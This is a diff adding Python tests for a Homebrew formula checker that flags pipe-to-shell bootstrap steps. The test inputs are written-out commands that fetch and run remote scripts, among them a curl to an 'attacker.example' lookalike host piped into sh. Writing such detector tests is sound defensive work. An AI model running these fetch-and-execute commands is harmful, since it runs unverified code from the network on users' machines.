@@ -80,6 +80,39 @@ system "tar", "-xzf", nginx_archive
     assert "verified before extraction" in messages
 
 
+def test_homebrew_formula_rejects_wget_pipe_to_shell() -> None:
+    """The executable wget variant is the same unverified bootstrap risk."""
+    findings = check_homebrew_formula(
+        'system "bash", "-c", "wget -qO- https://sh.rustup.rs | env sh"\n'
+    )
+
+    assert any("network rustup script" in finding.message for finding in findings)
+
+
+def test_homebrew_formula_rejects_multiline_ruby_system_bootstrap() -> None:
+    """Ruby permits the shell command to be continued onto the next line."""
+    findings = check_homebrew_formula(
+        'system "bash", "-c",\n'
+        '       "curl -fsSL https://sh.rustup.rs | sh"\n'
+    )
+
+    assert any("network rustup script" in finding.message for finding in findings)
+
+
+def test_homebrew_formula_ignores_non_executable_and_lookalike_rustup_urls() -> None:
+    """Only an executable pipe to the exact official host is forbidden."""
+    findings = check_homebrew_formula(
+        """
+# curl https://sh.rustup.rs | sh
+desc "Documentation: https://sh.rustup.rs"
+system "bash", "-c", "curl https://sh.rustup.rs.attacker.example | sh"
+system "bash", "-c", "wget https://example.test/rustup-init"
+"""
+    )
+
+    assert not any("network rustup script" in finding.message for finding in findings)
+
+
 def test_current_formula_verifier_rejects_historical_unverified_bootstrap() -> None:
     """Old executable Formula content cannot bypass the current template."""
     trusted = """class Example < Formula
